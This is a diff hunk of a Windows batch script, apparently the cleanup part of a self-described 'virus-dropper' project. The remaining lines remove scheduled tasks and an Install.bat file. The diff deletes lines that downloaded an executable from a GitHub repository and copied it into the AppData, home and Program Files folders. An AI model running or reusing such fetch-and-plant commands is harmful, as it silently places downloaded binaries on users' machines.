@@ -20,11 +20,6 @@ powershell -Command "Unregister-ScheduledTask -TaskName 'AV.bat' -Confirm:$false
 powershell -Command "Unregister-ScheduledTask -TaskName 'Update.bat' -Confirm:$false"
 powershell -Command "Unregister-ScheduledTask -TaskName 'uninstallTEMP' -Confirm:$false"
 
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/Include%20me%20in%20a%20archive%20if%20under%20Windows%2010/CURL.exe" --output "CURL.exe"
-copy "CURL.exe" "%appdata%\CURL.exe"
-copy "CURL.exe" "%homepath%\CURL.exe"
-copy "CURL.exe" "%programfiles%\CURL.exe"
-del curl.exe
 del /f "%appdata%\Windows\Install.bat"
 rd %appdata%\Windows
 powershell -Command "Unregister-ScheduledTask -TaskName 'Install.bat' -Confirm:$false"
